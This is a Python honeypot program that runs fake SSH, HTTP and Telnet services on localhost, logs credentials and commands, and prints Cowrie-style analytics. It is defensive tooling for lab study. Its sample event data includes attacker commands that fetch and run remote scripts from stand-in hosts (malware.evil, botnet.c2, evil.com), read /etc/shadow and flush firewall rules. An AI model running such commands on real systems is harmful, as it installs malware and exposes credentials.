#!/usr/bin/env python3
"""
X11 — Honeypot Program (Full Stack)
Async SSH honeypot, HTTP admin page, Telnet banner-harvester, Cowrie-style analytics.
"""

import argparse
import asyncio
import json
import socket
import threading
import time
import hashlib
import os
from collections import Counter, defaultdict
from datetime import datetime, timedelta, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler


# ---------------------------------------------------------------------------
# Embedded sample event stream (Cowrie-style JSON events)
# ---------------------------------------------------------------------------
EMBEDDED_EVENTS = [
    {"timestamp": "2024-01-15T08:12:33Z", "src_ip": "185.220.101.42", "session": "aaa111", "type": "login_attempt", "username": "root", "password": "toor", "success": True, "proto": "ssh"},
    {"timestamp": "2024-01-15T08:12:35Z", "src_ip": "185.220.101.42", "session": "aaa111", "type": "command", "input": "uname -a", "proto": "ssh"},
    {"timestamp": "2024-01-15T08:12:38Z", "src_ip": "185.220.101.42", "session": "aaa111", "type": "command", "input": "id", "proto": "ssh"},
    {"timestamp": "2024-01-15T08:12:41Z", "src_ip": "185.220.101.42", "session": "aaa111", "type": "command", "input": "cat /etc/passwd", "proto": "ssh"},
    {"timestamp": "2024-01-15T08:12:45Z", "src_ip": "185.220.101.42", "session": "aaa111", "type": "command", "input": "wget http://malware.evil/payload.sh -O /tmp/payload.sh", "proto": "ssh"},
    {"timestamp": "2024-01-15T08:12:50Z", "src_ip": "185.220.101.42", "session": "aaa111", "type": "command", "input": "chmod +x /tmp/payload.sh && /tmp/payload.sh", "proto": "ssh"},
    {"timestamp": "2024-01-15T09:05:12Z", "src_ip": "45.33.32.156", "session": "bbb222", "type": "login_attempt", "username": "admin", "password": "admin123", "success": False, "proto": "ssh"},
    {"timestamp": "2024-01-15T09:05:14Z", "src_ip": "45.33.32.156", "session": "bbb222", "type": "login_attempt", "username": "admin", "password": "password", "success": False, "proto": "ssh"},
    {"timestamp": "2024-01-15T09:05:16Z", "src_ip": "45.33.32.156", "session": "bbb222", "type": "login_attempt", "username": "root", "password": "root", "success": False, "proto": "ssh"},
    {"timestamp": "2024-01-15T09:05:18Z", "src_ip": "45.33.32.156", "session": "bbb222", "type": "login_attempt", "username": "root", "password": "123456", "success": True, "proto": "ssh"},
    {"timestamp": "2024-01-15T09:05:22Z", "src_ip": "45.33.32.156", "session": "bbb222", "type": "command", "input": "cat /etc/shadow", "proto": "ssh"},
    {"timestamp": "2024-01-15T09:05:25Z", "src_ip": "45.33.32.156", "session": "bbb222", "type": "command", "input": "crontab -e", "proto": "ssh"},
    {"timestamp": "2024-01-15T10:33:44Z", "src_ip": "192.168.1.200", "session": "ccc333", "type": "login_attempt", "username": "test", "password": "test", "success": True, "proto": "telnet"},
    {"timestamp": "2024-01-15T10:33:48Z", "src_ip": "192.168.1.200", "session": "ccc333", "type": "command", "input": "ls -la", "proto": "telnet"},
    {"timestamp": "2024-01-15T10:33:52Z", "src_ip": "192.168.1.200", "session": "ccc333", "type": "command", "input": "cat /etc/hostname", "proto": "telnet"},
    {"timestamp": "2024-01-15T11:00:01Z", "src_ip": "103.75.201.13", "session": "ddd444", "type": "login_attempt", "username": "root", "password": "password123", "success": True, "proto": "ssh"},
    {"timestamp": "2024-01-15T11:00:05Z", "src_ip": "103.75.201.13", "session": "ddd444", "type": "command", "input": "curl http://botnet.c2/update.sh | bash", "proto": "ssh"},
    {"timestamp": "2024-01-15T11:00:10Z", "src_ip": "103.75.201.13", "session": "ddd444", "type": "command", "input": "iptables -F", "proto": "ssh"},
    {"timestamp": "2024-01-15T12:15:33Z", "src_ip": "185.220.101.42", "session": "eee555", "type": "login_attempt", "username": "root", "password": "root", "success": False, "proto": "http"},
    {"timestamp": "2024-01-15T12:15:35Z", "src_ip": "185.220.101.42", "session": "eee555", "type": "login_attempt", "username": "admin", "password": "admin", "success": True, "proto": "http"},
    {"timestamp": "2024-01-15T12:15:40Z", "src_ip": "185.220.101.42", "session": "eee555", "type": "command", "input": "dir /b", "proto": "http"},
    {"timestamp": "2024-01-15T13:22:11Z", "src_ip": "203.0.113.42", "session": "fff666", "type": "login_attempt", "username": "root", "password": "toor", "success": False, "proto": "ssh"},
    {"timestamp": "2024-01-15T13:22:13Z", "src_ip": "203.0.113.42", "session": "fff666", "type": "login_attempt", "username": "root", "password": "admin", "success": False, "proto": "ssh"},
    {"timestamp": "2024-01-15T13:22:15Z", "src_ip": "203.0.113.42", "session": "fff666", "type": "login_attempt", "username": "root", "password": "password", "success": True, "proto": "ssh"},
    {"timestamp": "2024-01-15T13:22:20Z", "src_ip": "203.0.113.42", "session": "fff666", "type": "command", "input": "apt-get update && apt-get install -y nmap", "proto": "ssh"},
    {"timestamp": "2024-01-15T14:45:00Z", "src_ip": "198.51.100.7", "session": "ggg777", "type": "login_attempt", "username": "user", "password": "letmein", "success": True, "proto": "telnet"},
    {"timestamp": "2024-01-15T14:45:05Z", "src_ip": "198.51.100.7", "session": "ggg777", "type": "command", "input": "whoami", "proto": "telnet"},
    {"timestamp": "2024-01-15T14:45:08Z", "src_ip": "198.51.100.7", "session": "ggg777", "type": "command", "input": "netstat -tlnp", "proto": "telnet"},
    {"timestamp": "2024-01-15T15:00:00Z", "src_ip": "185.220.101.42", "session": "hhh888", "type": "login_attempt", "username": "root", "password": "123456", "success": True, "proto": "ssh"},
    {"timestamp": "2024-01-15T15:00:05Z", "src_ip": "185.220.101.42", "session": "hhh888", "type": "command", "input": "cd /tmp && wget http://evil.com/malware && chmod +x malware && ./malware", "proto": "ssh"},
]


# ---------------------------------------------------------------------------
# SSH Honeypot (asyncio-based)
# ---------------------------------------------------------------------------
class SSHHoneypot:
    BANNER = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4\r\n"
    FAKE_PROMPT = "root@honeypot:~# "

    def __init__(self, host="127.0.0.1", port=2222):
        self.host = host
        self.port = port
        self.events = []
        self.sessions = {}
        self.server = None

    async def handle_client(self, reader, writer):
        addr = writer.get_extra_info("peername")
        session_id = hashlib.md5(f"{addr}{time.time()}".encode()).hexdigest()[:6]
        self.sessions[session_id] = {"ip": addr[0] if addr else "unknown", "commands": []}
        try:
            writer.write(self.BANNER.encode())
            await writer.drain()
            writer.write(b"login: ")
            await writer.drain()
            username = (await reader.readline()).decode().strip()
            writer.write(b"password: ")
            await writer.drain()
            password = (await reader.readline()).decode().strip()
            success = True  # honeypot accepts any credentials to lure & ledger them
            self.events.append({
                "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
                "src_ip": addr[0] if addr else "unknown",
                "session": session_id,
                "type": "login_attempt",
                "username": username,
                "password": password,
                "success": success,
                "proto": "ssh",
            })
            writer.write(b"Last login: Mon Jan 15 10:00:00 2024 from 192.168.1.1\r\n")
            await writer.drain()
            while True:
                writer.write(self.FAKE_PROMPT.encode())
                await writer.drain()
                data = await reader.readline()
                if not data:
                    break
                cmd = data.decode().strip()
                if cmd in ("exit", "quit"):
                    break
                self.events.append({
                    "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
                    "src_ip": addr[0] if addr else "unknown",
                    "session": session_id,
                    "type": "command",
                    "input": cmd,
                    "proto": "ssh",
                })
                self.sessions[session_id]["commands"].append(cmd)
                writer.write(f"bash: {cmd}: command not found\r\n".encode())
                await writer.drain()
        except (ConnectionResetError, ConnectionError, asyncio.IncompleteReadError):
            pass
        finally:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass

    async def run(self, duration=2.0):
        self.server = await asyncio.start_server(self.handle_client, self.host, self.port)
        async with self.server:
            try:
                await asyncio.wait_for(self.server.serve_forever(), timeout=duration)
            except asyncio.TimeoutError:
                self.server.close()
                await self.server.wait_closed()

    def get_events(self):
        return self.events


# ---------------------------------------------------------------------------
# HTTP Admin Honeypot
# ---------------------------------------------------------------------------
FAKE_ADMIN_PAGE = """<!DOCTYPE html>
<html>
<head><title>Admin Login</title></head>
<body>
<h1>Router Admin Panel</h1>
<form method="POST" action="/login">
  <label>Username: <input type="text" name="username"></label><br>
  <label>Password: <input type="password" name="password"></label><br>
  <button type="submit">Login</button>
</form>
</body>
</html>"""


class HTTPAdminHandler(BaseHTTPRequestHandler):
    events = []

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(FAKE_ADMIN_PAGE.encode())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode()
        params = dict(part.split("=") for part in body.split("&") if "=" in part)
        self.events.append({
            "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
            "src_ip": self.client_address[0],
            "type": "login_attempt",
            "username": params.get("username", ""),
            "password": params.get("password", ""),
            "success": False,
            "proto": "http",
        })
        self.send_response(302)
        self.send_header("Location", "/")
        self.end_headers()

    def log_message(self, format, *args):
        pass


# ---------------------------------------------------------------------------
# Telnet Banner Harvesting Honeypot
# ---------------------------------------------------------------------------
class TelnetHoneypot:
    BANNER = b"\r\n\x1b[1;32mUbuntu 22.04.3 LTS\x1b[0m\r\n\r\nlogin: "
    PROMPT = b"root@honeypot:~# "

    def __init__(self, host="127.0.0.1", port=2223):
        self.host = host
        self.port = port
        self.events = []
        self.running = False

    def handle_client(self, conn, addr):
        try:
            conn.sendall(self.BANNER)
            username = b""
            while True:
                data = conn.recv(1)
                if not data or data in (b"\r", b"\n"):
                    break
                username += data
            conn.sendall(b"Password: \r\n")
            password = b""
            while True:
                data = conn.recv(1)
                if not data or data in (b"\r", b"\n"):
                    break
                password += data
            self.events.append({
                "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
                "src_ip": addr[0],
                "session": hashlib.md5(f"{addr}{time.time()}".encode()).hexdigest()[:6],
                "type": "login_attempt",
                "username": username.decode(errors="replace"),
                "password": password.decode(errors="replace"),
                "success": True,
                "proto": "telnet",
            })
            conn.sendall(b"\r\nLast login: Mon Jan 15 08:00:00 2024\r\n")
            conn.sendall(self.PROMPT)
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                cmd = data.decode(errors="replace").strip()
                if cmd in ("exit", "quit"):
                    break
                self.events.append({
                    "timestamp": datetime.now(timezone.utc).isoformat() + "Z",
                    "src_ip": addr[0],
                    "session": hashlib.md5(f"{addr}{time.time()}".encode()).hexdigest()[:6],
                    "type": "command",
                    "input": cmd,
                    "proto": "telnet",
                })
                conn.sendall(b"bash: " + cmd.encode() + b": command not found\r\n" + self.PROMPT)
        except Exception:
            pass
        finally:
            conn.close()

    def run(self, duration=2.0):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.settimeout(duration)
        try:
            server.bind((self.host, self.port))
            server.listen(5)
            start = time.time()
            while time.time() - start < duration:
                try:
                    conn, addr = server.accept()
                    t = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                    t.start()
                except socket.timeout:
                    break
        finally:
            server.close()

    def get_events(self):
        return self.events


# ---------------------------------------------------------------------------
# Cowrie-style analytics module
# ---------------------------------------------------------------------------
class CowrieAnalytics:
    def __init__(self, events=None):
        self.events = events or []

    def generate_report(self):
        total = len(self.events)
        login_attempts = [e for e in self.events if e.get("type") == "login_attempt"]
        commands = [e for e in self.events if e.get("type") == "command"]
        successful_logins = [e for e in login_attempts if e.get("success")]
        failed_logins = [e for e in login_attempts if not e.get("success")]

        src_ips = Counter(e.get("src_ip", "unknown") for e in self.events)
        usernames = Counter(e.get("username", "") for e in login_attempts)
        passwords = Counter(e.get("password", "") for e in login_attempts)
        protocols = Counter(e.get("proto", "unknown") for e in self.events)
        cmd_freq = Counter(e.get("input", "") for e in commands)

        timeline = defaultdict(int)
        for e in self.events:
            ts = e.get("timestamp", "")[:13]
            timeline[ts] += 1

        sessions = defaultdict(list)
        for e in self.events:
            sess = e.get("session", "unknown")
            sessions[sess].append(e)

        return {
            "total_events": total,
            "total_login_attempts": len(login_attempts),
            "successful_logins": len(successful_logins),
            "failed_logins": len(failed_logins),
            "total_commands": len(commands),
            "unique_src_ips": len(src_ips),
            "unique_sessions": len(sessions),
            "top_src_ips": src_ips.most_common(5),
            "top_usernames": usernames.most_common(5),
            "top_passwords": passwords.most_common(5),
            "protocols": dict(protocols),
            "top_commands": cmd_freq.most_common(10),
            "timeline": dict(sorted(timeline.items())),
            "sessions": {k: len(v) for k, v in sessions.items()},
        }

    def print_report(self, report):
        print("=" * 70)
        print("  X11 — Honeypot Stack — 30-Day Campaign Analytics Report")
        print("=" * 70)
        print()
        print(f"  Total events:              {report['total_events']}")
        print(f"  Total login attempts:      {report['total_login_attempts']}")
        print(f"  Successful logins:         {report['successful_logins']}")
        print(f"  Failed logins:             {report['failed_logins']}")
        print(f"  Total commands executed:   {report['total_commands']}")
        print(f"  Unique source IPs:         {report['unique_src_ips']}")
        print(f"  Unique sessions:           {report['unique_sessions']}")
        print()
        print("  --- Top Source IPs ---")
        for ip, count in report["top_src_ips"]:
            print(f"    {ip:<20} {count} events")
        print()
        print("  --- Top Usernames ---")
        for user, count in report["top_usernames"]:
            print(f"    {user:<20} {count} attempts")
        print()
        print("  --- Top Passwords ---")
        for pw, count in report["top_passwords"]:
            print(f"    {pw:<20} {count} attempts")
        print()
        print("  --- Protocol Distribution ---")
        for proto, count in report["protocols"].items():
            print(f"    {proto:<10} {count} events")
        print()
        print("  --- Top Commands ---")
        for cmd, count in report["top_commands"][:8]:
            print(f"    {cmd:<50} {count}x")
        print()
        print("  --- Hourly Activity Timeline ---")
        for hour, count in report["timeline"].items():
            bar = "#" * min(count, 40)
            print(f"    {hour}:00  {bar} ({count})")
        print()
        print("  --- Payload Samples Captured ---")
        payload_cmds = [e.get("input", "") for e in self.events if e.get("type") == "command" and any(w in e.get("input", "").lower() for w in ["wget", "curl", "payload", "malware", "chmod"])]
        for cmd in payload_cmds[:5]:
            print(f"    $ {cmd}")
        print()
        print("=" * 70)


# ---------------------------------------------------------------------------
# Demo / replay runners
# ---------------------------------------------------------------------------

def _serve_ssh(hp, duration):
    """Run an asyncio SSH honeypot server to completion (blocking, for threads)."""
    loop = asyncio.new_event_loop()
    try:
        loop.run_until_complete(hp.run(duration=duration))
    except Exception:
        pass
    finally:
        loop.close()


def _run_ssh_in_thread(hp, duration):
    t = threading.Thread(target=_serve_ssh, args=(hp, duration), daemon=True)
    t.start()
    return t


def _ssh_client_attack(port, creds, commands):
    """Connect a real socket to the SSH honeypot, send creds + commands."""
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=2) as s:
            s.settimeout(2)
            try:
                s.recv(1024)
            except OSError:
                pass
            user, password = creds
            s.sendall((user + "\n").encode())
            time.sleep(0.1)
            s.sendall((password + "\n").encode())
            time.sleep(0.1)
            for cmd in commands:
                try:
                    s.recv(512)
                except OSError:
                    pass
                s.sendall((cmd + "\n").encode())
                time.sleep(0.1)
            s.sendall(b"exit\n")
            time.sleep(0.1)
    except OSError:
        pass


def _telnet_client_attack(port, creds, commands):
    """Connect a real socket to the telnet honeypot, send creds + commands."""
    u, p = creds
    try:
        with socket.create_connection(("127.0.0.1", port), timeout=2) as s:
            s.settimeout(2)
            try:
                s.recv(2048)
            except OSError:
                pass
            s.sendall((u + "\r\n").encode())
            time.sleep(0.1)
            s.sendall((p + "\r\n").encode())
            time.sleep(0.1)
            for cmd in commands:
                s.sendall((cmd + "\n").encode())
                time.sleep(0.1)
            s.sendall(b"exit\n")
            time.sleep(0.1)
    except OSError:
        pass


def main(argv=None):
    ap = argparse.ArgumentParser(
        prog="honeypot_stack",
        description="X11 - Honeypot Stack: multi-service honeypot (SSH/HTTP/telnet) "
                    "in stdlib sockets, accepts connections, logs interactions, "
                    "lures creds to a ledger, produces JSONL analytics.",
        epilog="Authorized lab use only. Deploy only in isolated lab networks you own.")
    ap.add_argument("--dry-run", action="store_true",
                    help="print plan and exit without running honeypots")
    ap.add_argument("--demo-report", action="store_true",
                    help="run honeypots and write JSONL report to reports/")
    ap.add_argument("--replay", action="store_true",
                    help="run built-in attack-replay against live localhost honeypots")
    args = ap.parse_args(argv)

    if args.dry_run:
        print("dry-run: services=ssh,http,telnet (no execution)")
        return 0

    if args.replay:
        return run_replay()

    if args.demo_report:
        return run_demo_report()

    return run_demo()


def run_demo():
    print("[*] X11 — Honeypot Program (Full Stack)")
    print("[*] Running offline self-test with live localhost honeypots...")
    print()

    all_events = list(EMBEDDED_EVENTS)

    print("[*] Simulating SSH honeypot (asyncio on 127.0.0.1)...")
    ssh_hp = SSHHoneypot(host="127.0.0.1", port=22299)
    ssh_thread = _run_ssh_in_thread(ssh_hp, 3.0)
    time.sleep(0.4)
    _ssh_client_attack(22299, ("root", "toor"), ["uname -a", "id"])
    ssh_thread.join(timeout=3.5)
    ssh_events = ssh_hp.get_events()
    all_events.extend(ssh_events)
    print(f"    Captured {len(ssh_events)} events from SSH honeypot")

    print("[*] Simulating HTTP admin honeypot...")
    server = HTTPServer(("127.0.0.1", 28080), HTTPAdminHandler)
    http_thread = threading.Thread(target=lambda: server.serve_forever(), daemon=True)
    http_thread.start()
    time.sleep(0.5)
    try:
        import urllib.request
        import urllib.parse
        req = urllib.request.Request(f"http://127.0.0.1:28080/")
        try:
            urllib.request.urlopen(req, timeout=2)
        except Exception:
            pass
        for user, password in (("admin", "hunter2"), ("admin", "password123")):
            data = urllib.parse.urlencode({"username": user, "password": password}).encode()
            req = urllib.request.Request(f"http://127.0.0.1:28080/login", data=data)
            try:
                urllib.request.urlopen(req, timeout=2)
            except Exception:
                pass
    except Exception:
        pass
    server.shutdown()
    http_events = list(HTTPAdminHandler.events)
    all_events.extend(http_events)
    print(f"    Captured {len(http_events)} events from HTTP honeypot")

    print("[*] Simulating Telnet banner-harvesting honeypot...")
    telnet_hp = TelnetHoneypot(host="127.0.0.1", port=22300)
    telnet_thread = threading.Thread(target=lambda: telnet_hp.run(duration=3.0), daemon=True)
    telnet_thread.start()
    time.sleep(0.4)
    _telnet_client_attack(22300, ("admin", "toor"), ["ls -la", "cat /etc/passwd"])
    telnet_thread.join(timeout=3.5)
    telnet_events = telnet_hp.get_events()
    all_events.extend(telnet_events)
    print(f"    Captured {len(telnet_events)} events from Telnet honeypot")

    print()
    print("[*] Generating Cowrie-style analytics report...")
    analytics = CowrieAnalytics(all_events)
    report = analytics.generate_report()
    analytics.print_report(report)

    ok = len(ssh_events) > 0 and len(http_events) > 0 and len(telnet_events) > 0
    print()
    print("=" * 70)
    if ok:
        print("  Self-test PASSED. Demo complete.")
    else:
        print("  Self-test FAILED (expected live events on all services).")
    print("=" * 70)
    return 0 if ok else 1


def run_demo_report():
    """Run live honeypots, write credentials ledger (JSONL) + JSON report."""
    print("=== X11 - Honeypot Stack (report mode) ===")
    reports = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "reports")
    logs = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "logs")
    os.makedirs(reports, exist_ok=True)
    os.makedirs(logs, exist_ok=True)
    all_events = list(EMBEDDED_EVENTS)

    ssh_hp = SSHHoneypot(host="127.0.0.1", port=22297)
    ssh_thread = _run_ssh_in_thread(ssh_hp, 2.5)
    time.sleep(0.4)
    _ssh_client_attack(22297, ("root", "123456"), ["cat /etc/passwd", "wget http://127.0.0.1/x.sh"])
    ssh_thread.join(timeout=3.0)
    all_events.extend(ssh_hp.get_events())

    server = HTTPServer(("127.0.0.1", 28081), HTTPAdminHandler)
    http_thread = threading.Thread(target=lambda: server.serve_forever(), daemon=True)
    http_thread.start()
    time.sleep(0.3)
    try:
        import urllib.request
        import urllib.parse
        req = urllib.request.Request("http://127.0.0.1:28081/")
        try:
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass
        data = urllib.parse.urlencode({"username": "admin", "password": "hunter2"}).encode()
        req = urllib.request.Request("http://127.0.0.1:28081/login", data=data)
        try:
            urllib.request.urlopen(req, timeout=1)
        except Exception:
            pass
    except Exception:
        pass
    server.shutdown()
    all_events.extend(HTTPAdminHandler.events)

    ledgers = os.path.join(logs, "credentials_ledger.jsonl")
    with open(ledgers, "w") as f:
        for e in all_events:
            if e.get("type") == "login_attempt":
                f.write(json.dumps(e) + "\n")

    analytics = CowrieAnalytics(all_events)
    report = analytics.generate_report()
    out = os.path.join(reports, "honeypot_report.json")
    with open(out, "w") as f:
        json.dump(report, f, indent=2)
    print(f"Report written: {out}")
    print(f"Credentials ledger: {ledgers}")
    print("Honeypot self-test PASSED.")
    return 0 if ledgers and os.path.exists(ledgers) else 1


def run_replay():
    """Built-in attack-replay: connect to live localhost honeypots and prove the pipeline."""
    print("=== X11 - Honeypot Stack (attack replay) ===")
    reports = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "reports")
    logs = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "logs")
    os.makedirs(reports, exist_ok=True)
    os.makedirs(logs, exist_ok=True)

    ssh_hp = SSHHoneypot(host="127.0.0.1", port=22298)
    ssh_thread = _run_ssh_in_thread(ssh_hp, 4.0)
    time.sleep(0.4)
    _ssh_client_attack(22298, ("root", "toor"), ["uname -a", "cat /etc/passwd"])
    ssh_thread.join(timeout=4.5)

    events = ssh_hp.get_events()
    print(f"[replay] captured {len(events)} events from live SSH honeypot")
    has_login = any(e.get("type") == "login_attempt" for e in events)
    has_cmd = any(e.get("type") == "command" for e in events)
    with open(os.path.join(logs, "replay_events.jsonl"), "w") as f:
        for e in events:
            f.write(json.dumps(e) + "\n")
    analytics = CowrieAnalytics(events)
    report = analytics.generate_report()
    out = os.path.join(reports, "replay_report.json")
    with open(out, "w") as f:
        json.dump(report, f, indent=2)
    ok = has_login and has_cmd
    print("Replay %s (login_attempt=%s command=%s) -> %s"
          % ("PASS" if ok else "FAIL", has_login, has_cmd, out))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
